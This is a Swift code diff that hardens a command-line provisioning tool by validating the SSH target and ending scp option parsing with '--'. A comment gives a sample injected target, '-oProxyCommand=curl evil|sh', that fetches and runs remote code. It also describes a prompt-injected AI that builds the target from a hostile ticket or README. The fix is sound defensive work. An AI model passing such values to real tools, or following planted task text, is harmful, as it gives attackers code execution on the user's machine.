@@ -36,9 +36,10 @@ struct EldrctlMain {
     // MARK: - install
 
     static func runInstall(_ a: [String: String]) throws {
-        guard let target = a["target"]?.nonEmpty else {
+        guard let rawTarget = a["target"]?.nonEmpty else {
             throw CLIError("install needs --target <user@host>")
         }
+        let target = try validatedTarget(rawTarget)
         let responder =
             ConduitProvisioner.Responder(rawValue: (a["responder"] ?? "sybilclaw")) ?? .sybilclaw
         // Install the GUI bundle by default; --no-app makes it headless-node-only.
@@ -133,7 +134,28 @@ struct EldrctlMain {
 
     static func requireTarget(_ a: [String: String]) throws -> String {
         guard let t = a["target"]?.nonEmpty else { throw CLIError("--target <user@host> is required.") }
-        return t
+        return try validatedTarget(t)
+    }
+
+    /// Validate a `[user@]host[:port]` destination before it is passed as a bare argv
+    /// element to `ssh`/`scp`.
+    ///
+    /// `Process.arguments` bypasses the shell, so `;`/backtick injection is not the risk
+    /// — argument injection is: OpenSSH parses argv with getopt and does NOT require
+    /// options to precede the destination, so a `target` beginning with `-` (e.g.
+    /// `-oProxyCommand=curl evil|sh`) is taken as a CLIENT OPTION and runs an arbitrary
+    /// local program. `eldrctl` is documented as a tool an AI may drive, so a `--target`
+    /// built from attacker-influenced text (a ticket/README read during a prompt-injected
+    /// task) is a realistic local-code-execution path. Values embedded in the REMOTE
+    /// command string are already `shellQuote`d; this closes the distinct local-invocation
+    /// hole. Reject a leading `-` and whitelist the destination charset.
+    static func validatedTarget(_ target: String) throws -> String {
+        guard ConduitProvisioner.isSafeSSHDestination(target) else {
+            throw CLIError(
+                "--target must be a plain [user@]host[:port] and may not begin with '-' "
+                    + "(got \(target)).")
+        }
+        return target
     }
 
     // MARK: - SSH / SCP plumbing
@@ -151,6 +173,11 @@ struct EldrctlMain {
     static func scp(_ local: String, _ remote: String, recursive: Bool) throws {
         var args: [String] = []
         if recursive { args.append("-r") }
+        // `--` ends scp's option parsing so neither positional (a local path from
+        // --node/--app, or the target-derived remote) can be read as an option even if
+        // it begins with '-'. Modern OpenSSH scp supports this; the target itself is
+        // already shape-validated in `validatedTarget`.
+        args.append("--")
         args += [local, remote]
         _ = try proc("/usr/bin/scp", args, captureOut: false)
     }
